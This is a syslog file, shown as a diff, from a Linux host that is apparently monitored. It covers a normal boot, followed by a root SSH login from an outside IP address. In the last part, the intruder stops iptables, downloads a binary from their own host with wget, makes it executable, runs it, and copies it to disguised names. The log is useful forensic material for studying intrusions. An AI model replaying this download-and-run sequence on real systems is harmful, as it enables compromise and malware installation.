@@ -1,0 +1,155 @@
+Apr  7 10:31:03 hp snoopy[414]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/tput]: /usr/bin/tput hpa 60 
+Apr  7 10:31:03 hp snoopy[415]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 1 
+Apr  7 10:31:03 hp snoopy[416]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/tput]: /usr/bin/tput xenl 
+Apr  7 10:31:03 hp snoopy[417]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/tput]: /usr/bin/tput cols 
+Apr  7 10:31:03 hp snoopy[418]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/expr]: /usr/bin/expr 80 - 7 
+Apr  7 10:31:03 hp snoopy[419]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/plymouth]: plymouth --ping 
+Apr  7 10:31:03 hp snoopy[420]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/make]: /usr/bin/make all -s -C /etc/mail 
+Apr  7 10:31:03 hp snoopy[423]: [uid:0 sid:301 tty:/dev/console cwd:/etc/mail filename:/usr/share/sendmail/update_auth]: /usr/share/sendmail/update_auth 
+Apr  7 10:31:03 hp snoopy[424]: [uid:0 sid:301 tty:/dev/console cwd:/etc/mail filename:/bin/hostname]: hostname -s 
+Apr  7 10:31:03 hp snoopy[425]: [uid:0 sid:301 tty:/dev/console cwd:/etc/mail filename:/bin/hostname]: hostname -f 
+Apr  7 10:31:13 hp snoopy[428]: [uid:0 sid:301 tty:/dev/console cwd:/etc/mail filename:/usr/share/sendmail/update_tls]: /usr/share/sendmail/update_tls 
+Apr  7 10:31:13 hp snoopy[429]: [uid:0 sid:301 tty:/dev/console cwd:/etc/mail filename:/bin/hostname]: hostname -s 
+Apr  7 10:31:13 hp snoopy[430]: [uid:0 sid:301 tty:/dev/console cwd:/etc/mail filename:/bin/hostname]: hostname -d 
+Apr  7 10:31:20 hp snoopy[435]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/mkdir]: mkdir -p /var/run/sendmail 
+Apr  7 10:31:20 hp snoopy[436]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/chown]: chown root:smmta /var/run/sendmail 
+Apr  7 10:31:20 hp snoopy[437]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/chmod]: chmod 02755 /var/run/sendmail 
+Apr  7 10:31:20 hp snoopy[438]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/mkdir]: mkdir -p /var/run/sendmail/mta 
+Apr  7 10:31:20 hp snoopy[439]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/chown]: chown root:smmta /var/run/sendmail/mta 
+Apr  7 10:31:20 hp snoopy[440]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/chmod]: chmod 02755 /var/run/sendmail/mta 
+Apr  7 10:31:20 hp snoopy[441]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/mkdir]: mkdir -p /var/run/sendmail/msp 
+Apr  7 10:31:20 hp snoopy[442]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/chown]: chown smmsp:smmsp /var/run/sendmail/msp 
+Apr  7 10:31:20 hp snoopy[443]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/chmod]: chmod 02775 /var/run/sendmail/msp 
+Apr  7 10:31:20 hp snoopy[444]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/mkdir]: mkdir -p /var/run/sendmail/stampdir 
+Apr  7 10:31:20 hp snoopy[445]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/chown]: chown root:smmsp /var/run/sendmail/stampdir 
+Apr  7 10:31:20 hp snoopy[446]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/chmod]: chmod 02775 /var/run/sendmail/stampdir 
+Apr  7 10:31:20 hp snoopy[449]: [uid:0 sid:301 tty: cwd:/ filename:/usr/bin/tr]: tr [:upper:] [:lower:] 
+Apr  7 10:31:20 hp snoopy[450]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/touch]: touch /var/run/sendmail/stampdir/reload 
+Apr  7 10:31:20 hp snoopy[451]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/touch]: touch /var/run/sendmail/mta/smsocket 
+Apr  7 10:31:20 hp snoopy[453]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/bin/sleep]: sleep 2 
+Apr  7 10:31:20 hp snoopy[452]: [uid:0 sid:301 tty: cwd:/run/sendmail/mta filename:/sbin/start-stop-daemon]: start-stop-daemon --pidfile /var/run/sendmail/mta/sendmail.pid --exec /usr/sbin/sendmail-mta --startas /usr/sbin/sendmail-mta --start -- -Am -L sm-mta -bd -q10m 
+Apr  7 10:31:20 hp snoopy[452]: [uid:0 sid:301 tty: cwd:/ filename:/usr/sbin/sendmail-mta]: /usr/sbin/sendmail-mta -Am -L sm-mta -bd -q10m 
+Apr  7 10:31:22 hp snoopy[456]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/bin/chown]: chown root:smmsp /var/run/sendmail/mta/smsocket 
+Apr  7 10:31:22 hp snoopy[457]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/bin/chmod]: chmod 0666 /var/run/sendmail/mta/smsocket 
+Apr  7 10:31:22 hp snoopy[458]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/bin/grep]: grep -qEe ^[[:space:]]*`?FEATURE\([[:space:]]*`?msp /etc/mail/submit.mc 
+Apr  7 10:31:22 hp snoopy[459]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/usr/sbin/sendmail-msp]: /usr/sbin/sendmail-msp -q -Ac -L sm-msp-queue 
+Apr  7 10:31:22 hp snoopy[461]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/bin/grep]: grep -qEe ^[[:space:]]*`?FEATURE\([[:space:]]*`?msp /etc/mail/submit.mc 
+Apr  7 10:31:22 hp snoopy[464]: [uid:0 sid:301 tty: cwd:/run/sendmail/mta filename:/usr/bin/tr]: tr [:upper:] [:lower:] 
+Apr  7 10:31:22 hp snoopy[465]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/bin/grep]: grep -qEe ^[[:space:]]*`?FEATURE\([[:space:]]*`?msp /etc/mail/submit.mc 
+Apr  7 10:31:22 hp snoopy[466]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/bin/plymouth]: plymouth --ping 
+Apr  7 10:31:22 hp snoopy[467]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/usr/bin/tput]: /usr/bin/tput hpa 60 
+Apr  7 10:31:22 hp snoopy[468]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/usr/bin/tput]: /usr/bin/tput setaf 1 
+Apr  7 10:31:22 hp snoopy[469]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/usr/bin/tput]: /usr/bin/tput xenl 
+Apr  7 10:31:22 hp snoopy[470]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/usr/bin/tput]: /usr/bin/tput cols 
+Apr  7 10:31:22 hp snoopy[471]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/usr/bin/expr]: /usr/bin/expr 80 - 7 
+Apr  7 10:31:22 hp snoopy[472]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/bin/plymouth]: plymouth --ping 
+Apr  7 10:31:22 hp snoopy[473]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/usr/bin/expr]: /usr/bin/expr 80 - 1 
+Apr  7 10:31:22 hp snoopy[474]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/usr/bin/tput]: /usr/bin/tput hpa 79 
+Apr  7 10:31:22 hp snoopy[475]: [uid:0 sid:301 tty:/dev/console cwd:/run/sendmail/mta filename:/usr/bin/tput]: /usr/bin/tput hpa 73 
+Apr  7 10:31:22 hp snoopy[476]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/etc/rc2.d/S75sudo]: /etc/rc2.d/S75sudo start 
+Apr  7 10:31:22 hp snoopy[477]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/find]: find /var/lib/sudo -exec touch -t 198501010000 {} ; 
+Apr  7 10:31:22 hp snoopy[481]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/etc/rc2.d/S91apache2]: /etc/rc2.d/S91apache2 start 
+Apr  7 10:31:22 hp snoopy[484]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/run-parts]: run-parts --lsbsysinit --list /lib/lsb/init-functions.d 
+Apr  7 10:31:22 hp snoopy[487]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/tput]: /usr/bin/tput hpa 60 
+Apr  7 10:31:22 hp snoopy[488]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/tput]: /usr/bin/tput setaf 1 
+Apr  7 10:31:22 hp snoopy[489]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/tput]: /usr/bin/tput xenl 
+Apr  7 10:31:22 hp snoopy[490]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/tput]: /usr/bin/tput cols 
+Apr  7 10:31:22 hp snoopy[491]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/expr]: /usr/bin/expr 80 - 7 
+Apr  7 10:31:22 hp snoopy[492]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/plymouth]: plymouth --ping 
+Apr  7 10:31:22 hp snoopy[493]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/mktemp]: mktemp 
+Apr  7 10:31:22 hp snoopy[494]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/env]: env -i LANG=C PATH=/usr/local/bin:/usr/bin:/bin /usr/sbin/apache2ctl configtest 
+Apr  7 10:31:22 hp snoopy[495]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/id]: id -u 
+Apr  7 10:31:22 hp snoopy[496]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/mkdir]: mkdir -p /var/run/apache2 
+Apr  7 10:31:22 hp snoopy[498]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/stat]: stat -c %F:%U /var/lock/apache2 
+Apr  7 10:31:22 hp snoopy[499]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/mktemp]: mktemp -d /var/lock/apache2.XXXXXXXXXX 
+Apr  7 10:31:22 hp snoopy[500]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/chmod]: chmod 755 /var/lock/apache2.NbhCdQLYdD 
+Apr  7 10:31:22 hp snoopy[501]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/chown]: chown www-data /var/lock/apache2.NbhCdQLYdD 
+Apr  7 10:31:22 hp snoopy[502]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/mv]: mv -T /var/lock/apache2.NbhCdQLYdD /var/lock/apache2 
+Apr  7 10:31:22 hp snoopy[503]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/sbin/apache2]: /usr/sbin/apache2 -t 
+Apr  7 10:31:22 hp snoopy[504]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/rm]: rm -f /tmp/tmp.n4bNkRrdQm 
+Apr  7 10:31:22 hp snoopy[505]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/env]: env -i LANG=C PATH=/usr/local/bin:/usr/bin:/bin /usr/sbin/apache2ctl start 
+Apr  7 10:31:22 hp snoopy[506]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/bin/id]: id -u 
+Apr  7 10:31:22 hp snoopy[507]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/rm]: rm -f /var/run/apache2/*ssl_scache* 
+Apr  7 10:31:22 hp snoopy[508]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/usr/sbin/apache2]: /usr/sbin/apache2 -k start 
+Apr  7 10:31:22 hp snoopy[511]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/sleep]: sleep 1 
+Apr  7 10:31:23 hp snoopy[541]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/etc/rc2.d/S99mystartup.sh]: /etc/rc2.d/S99mystartup.sh start 
+Apr  7 10:31:23 hp snoopy[543]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/etc/rc2.d/S99rc.local]: /etc/rc2.d/S99rc.local start 
+Apr  7 10:31:23 hp snoopy[544]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/cat]: cat /proc/cmdline 
+Apr  7 10:31:23 hp snoopy[545]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/bin/run-parts]: run-parts --lsbsysinit --list /lib/lsb/init-functions.d 
+Apr  7 10:31:23 hp snoopy[546]: [uid:0 sid:301 tty:/dev/console cwd:/ filename:/etc/rc.local]: /etc/rc.local 
+Apr  7 10:31:23 hp snoopy[547]: [uid:0 sid:547 tty: cwd:/ filename:/usr/local/sbin/startpar-upstart-inject]: startpar-upstart-inject rc  stopped 
+Apr  7 10:31:23 hp snoopy[547]: [uid:0 sid:547 tty: cwd:/ filename:/usr/local/bin/startpar-upstart-inject]: startpar-upstart-inject rc  stopped 
+Apr  7 10:31:23 hp snoopy[547]: [uid:0 sid:547 tty: cwd:/ filename:/usr/bin/startpar-upstart-inject]: startpar-upstart-inject rc  stopped 
+Apr  7 10:31:23 hp snoopy[547]: [uid:0 sid:547 tty: cwd:/ filename:/usr/sbin/startpar-upstart-inject]: startpar-upstart-inject rc  stopped 
+Apr  7 10:31:23 hp snoopy[547]: [uid:0 sid:547 tty: cwd:/ filename:/sbin/startpar-upstart-inject]: startpar-upstart-inject rc  stopped 
+Apr  7 10:31:23 hp snoopy[548]: [uid:0 sid:548 tty: cwd:/ filename:/bin/plymouth]: /bin/plymouth quit 
+Apr  7 10:31:23 hp snoopy[549]: [uid:0 sid:549 tty: cwd:/ filename:/usr/local/sbin/startpar-upstart-inject]: startpar-upstart-inject plymouth  stopped 
+Apr  7 10:31:23 hp snoopy[549]: [uid:0 sid:549 tty: cwd:/ filename:/usr/local/bin/startpar-upstart-inject]: startpar-upstart-inject plymouth  stopped 
+Apr  7 10:31:23 hp snoopy[549]: [uid:0 sid:549 tty: cwd:/ filename:/usr/bin/startpar-upstart-inject]: startpar-upstart-inject plymouth  stopped 
+Apr  7 10:31:23 hp snoopy[549]: [uid:0 sid:549 tty: cwd:/ filename:/usr/sbin/startpar-upstart-inject]: startpar-upstart-inject plymouth  stopped 
+Apr  7 10:31:23 hp snoopy[549]: [uid:0 sid:549 tty: cwd:/ filename:/sbin/startpar-upstart-inject]: startpar-upstart-inject plymouth  stopped 
+Apr  7 10:31:23 hp snoopy[550]: [uid:0 sid:550 tty: cwd:/ filename:/usr/local/sbin/startpar-upstart-inject]: startpar-upstart-inject plymouth-stop  stopped 
+Apr  7 10:31:23 hp snoopy[550]: [uid:0 sid:550 tty: cwd:/ filename:/usr/local/bin/startpar-upstart-inject]: startpar-upstart-inject plymouth-stop  stopped 
+Apr  7 10:31:23 hp snoopy[550]: [uid:0 sid:550 tty: cwd:/ filename:/usr/bin/startpar-upstart-inject]: startpar-upstart-inject plymouth-stop  stopped 
+Apr  7 10:31:23 hp snoopy[550]: [uid:0 sid:550 tty: cwd:/ filename:/usr/sbin/startpar-upstart-inject]: startpar-upstart-inject plymouth-stop  stopped 
+Apr  7 10:31:23 hp snoopy[550]: [uid:0 sid:550 tty: cwd:/ filename:/sbin/startpar-upstart-inject]: startpar-upstart-inject plymouth-stop  stopped 
+Apr  7 10:39:15 hp snoopy[551]: [uid:0 sid:551 tty: cwd:/ filename:/usr/sbin/sshd]: /usr/sbin/sshd -D -R 
+Apr  7 10:39:15 hp sshd[551]: error: Could not load host key: /etc/ssh/ssh_host_ecdsa_key
+Apr  7 10:39:54 hp sshd[551]: Accepted password for root from 183.57.38.212 port 1425 ssh2
+Apr  7 10:39:54 hp sshd[551]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Apr  7 10:39:54 hp snoopy[554]: [uid:0 sid:551 tty: cwd:/ filename:/usr/bin/env]: /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d 
+Apr  7 10:39:54 hp snoopy[555]: [uid:0 sid:551 tty: cwd:/ filename:/etc/update-motd.d/00-header]: /etc/update-motd.d/00-header 
+Apr  7 10:39:54 hp snoopy[556]: [uid:0 sid:551 tty: cwd:/ filename:/bin/uname]: uname -o 
+Apr  7 10:39:54 hp snoopy[557]: [uid:0 sid:551 tty: cwd:/ filename:/bin/uname]: uname -r 
+Apr  7 10:39:54 hp snoopy[558]: [uid:0 sid:551 tty: cwd:/ filename:/bin/uname]: uname -m 
+Apr  7 10:39:54 hp snoopy[559]: [uid:0 sid:551 tty: cwd:/ filename:/etc/update-motd.d/10-help-text]: /etc/update-motd.d/10-help-text 
+Apr  7 10:39:54 hp snoopy[561]: [uid:0 sid:551 tty: cwd:/ filename:/bin/grep]: grep -qs \-server 
+Apr  7 10:39:54 hp snoopy[560]: [uid:0 sid:551 tty: cwd:/ filename:/bin/uname]: uname -r 
+Apr  7 10:39:54 hp snoopy[562]: [uid:0 sid:551 tty: cwd:/ filename:/etc/update-motd.d/99-footer]: /etc/update-motd.d/99-footer 
+Apr  7 10:39:54 hp sshd[551]: pam_env(sshd:session): Unable to open env file: /etc/default/locale: No such file or directory
+Apr  7 10:40:01 hp CRON[563]: pam_env(cron:session): Unable to open env file: /etc/default/locale: No such file or directory
+Apr  7 10:40:01 hp CRON[563]: pam_unix(cron:session): session opened for user smmsp by (uid=0)
+Apr  7 10:40:01 hp snoopy[565]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/usr/share/sendmail/sendmail]: /usr/share/sendmail/sendmail cron-msp 
+Apr  7 10:40:01 hp snoopy[566]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/bin/cat]: cat /proc/cmdline 
+Apr  7 10:40:01 hp snoopy[567]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/bin/run-parts]: run-parts --lsbsysinit --list /lib/lsb/init-functions.d 
+Apr  7 10:40:01 hp snoopy[570]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/usr/bin/tr]: tr [:upper:] [:lower:] 
+Apr  7 10:40:01 hp snoopy[573]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/usr/bin/tr]: tr [:upper:] [:lower:] 
+Apr  7 10:40:01 hp snoopy[576]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/usr/bin/tr]: tr [:upper:] [:lower:] 
+Apr  7 10:40:01 hp snoopy[577]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/usr/bin/basename]: basename /usr/share/sendmail/sendmail 
+Apr  7 10:40:01 hp snoopy[578]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/bin/grep]: grep -qEe ^[[:space:]]*`?FEATURE\([[:space:]]*`?msp /etc/mail/submit.mc 
+Apr  7 10:40:01 hp snoopy[579]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/bin/touch]: touch /var/run/sendmail/stampdir/cron_msp 
+Apr  7 10:40:01 hp snoopy[580]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/usr/sbin/sendmail-msp]: /usr/sbin/sendmail-msp -qf -Ac -L sm-msp-queue 
+Apr  7 10:40:01 hp snoopy[581]: [uid:107 sid:564 tty: cwd:/var/lib/sendmail filename:/bin/rm]: rm -f /var/run/sendmail/stampdir/cron_msp 
+Apr  7 10:40:01 hp CRON[563]: pam_unix(cron:session): session closed for user smmsp
+Apr  7 10:40:06 hp snoopy[584]: [uid:0 sid:582 tty: cwd:/root filename:/bin/sh]: /bin/sh /etc/ssh/sshrc 
+Apr  7 10:40:06 hp snoopy[587]: [uid:0 sid:582 tty: cwd:/root filename:/usr/bin/cut]: cut -d   -f 1 
+Apr  7 10:40:06 hp snoopy[588]: [uid:0 sid:582 tty: cwd:/root filename:/usr/bin/logger]: logger -t ssh-wrapper root login from 183.57.38.212 
+Apr  7 10:40:06 hp snoopy[590]: [uid:0 sid:582 tty: cwd:/root filename:/usr/bin/mail]: mail groupkrules@gmail.com 
+Apr  7 10:40:06 hp snoopy[591]: [uid:0 sid:582 tty: cwd:/root filename:/usr/sbin/sendmail]: send-mail -i -- groupkrules@gmail.com 
+Apr  7 10:40:06 hp snoopy[582]: [uid:0 sid:582 tty: cwd:/root filename:/bin/bash]: bash -c service iptables stop 
+Apr  7 10:40:06 hp snoopy[582]: [uid:0 sid:582 tty: cwd:/root filename:/usr/sbin/service]: service iptables stop 
+Apr  7 10:40:06 hp snoopy[595]: [uid:0 sid:582 tty: cwd:/root filename:/usr/bin/basename]: basename /usr/sbin/service 
+Apr  7 10:40:06 hp snoopy[596]: [uid:0 sid:582 tty: cwd:/root filename:/usr/bin/basename]: basename /usr/sbin/service 
+Apr  7 10:40:23 hp snoopy[599]: [uid:0 sid:597 tty: cwd:/root filename:/bin/sh]: /bin/sh /etc/ssh/sshrc 
+Apr  7 10:40:23 hp snoopy[602]: [uid:0 sid:597 tty: cwd:/root filename:/usr/bin/cut]: cut -d   -f 1 
+Apr  7 10:40:23 hp snoopy[603]: [uid:0 sid:597 tty: cwd:/root filename:/usr/bin/logger]: logger -t ssh-wrapper root login from 183.57.38.212 
+Apr  7 10:40:23 hp snoopy[605]: [uid:0 sid:597 tty: cwd:/root filename:/usr/bin/mail]: mail groupkrules@gmail.com 
+Apr  7 10:40:23 hp snoopy[606]: [uid:0 sid:597 tty: cwd:/root filename:/usr/sbin/sendmail]: send-mail -i -- groupkrules@gmail.com 
+Apr  7 10:40:23 hp snoopy[597]: [uid:0 sid:597 tty: cwd:/root filename:/bin/bash]: bash -c wget http://183.57.38.212:1234/daihaowangluo 
+Apr  7 10:40:23 hp snoopy[597]: [uid:0 sid:597 tty: cwd:/root filename:/usr/bin/wget]: wget http://183.57.38.212:1234/daihaowangluo 
+Apr  7 10:41:27 hp snoopy[613]: [uid:0 sid:611 tty: cwd:/root filename:/bin/sh]: /bin/sh /etc/ssh/sshrc 
+Apr  7 10:41:27 hp snoopy[616]: [uid:0 sid:611 tty: cwd:/root filename:/usr/bin/cut]: cut -d   -f 1 
+Apr  7 10:41:27 hp snoopy[617]: [uid:0 sid:611 tty: cwd:/root filename:/usr/bin/logger]: logger -t ssh-wrapper root login from 183.57.38.212 
+Apr  7 10:41:27 hp snoopy[619]: [uid:0 sid:611 tty: cwd:/root filename:/usr/bin/mail]: mail groupkrules@gmail.com 
+Apr  7 10:41:27 hp snoopy[620]: [uid:0 sid:611 tty: cwd:/root filename:/usr/sbin/sendmail]: send-mail -i -- groupkrules@gmail.com 
+Apr  7 10:41:27 hp snoopy[611]: [uid:0 sid:611 tty: cwd:/root filename:/bin/bash]: bash -c chmod u+x daihaowangluo 
+Apr  7 10:41:27 hp snoopy[611]: [uid:0 sid:611 tty: cwd:/root filename:/bin/chmod]: chmod u+x daihaowangluo 
+Apr  7 10:41:29 hp snoopy[626]: [uid:0 sid:624 tty: cwd:/root filename:/bin/sh]: /bin/sh /etc/ssh/sshrc 
+Apr  7 10:41:29 hp snoopy[629]: [uid:0 sid:624 tty: cwd:/root filename:/usr/bin/cut]: cut -d   -f 1 
+Apr  7 10:41:29 hp snoopy[630]: [uid:0 sid:624 tty: cwd:/root filename:/usr/bin/logger]: logger -t ssh-wrapper root login from 183.57.38.212 
+Apr  7 10:41:29 hp snoopy[632]: [uid:0 sid:624 tty: cwd:/root filename:/usr/bin/mail]: mail groupkrules@gmail.com 
+Apr  7 10:41:29 hp snoopy[633]: [uid:0 sid:624 tty: cwd:/root filename:/usr/sbin/sendmail]: send-mail -i -- groupkrules@gmail.com 
+Apr  7 10:41:29 hp snoopy[624]: [uid:0 sid:624 tty: cwd:/root filename:/bin/bash]: bash -c ./daihaowangluo & 
+Apr  7 10:41:29 hp snoopy[637]: [uid:0 sid:624 tty: cwd:/root filename:./daihaowangluo]: ./daihaowangluo 
+Apr  7 10:41:29 hp snoopy[639]: [uid:0 sid:624 tty: cwd:/root filename:/bin/cp]: cp /root/daihaowangluo /root/freeBSD 
+Apr  7 10:41:29 hp snoopy[642]: [uid:0 sid:624 tty: cwd:/root filename:/bin/cp]: cp /root/daihaowangluo /root/daihaowangluoa 
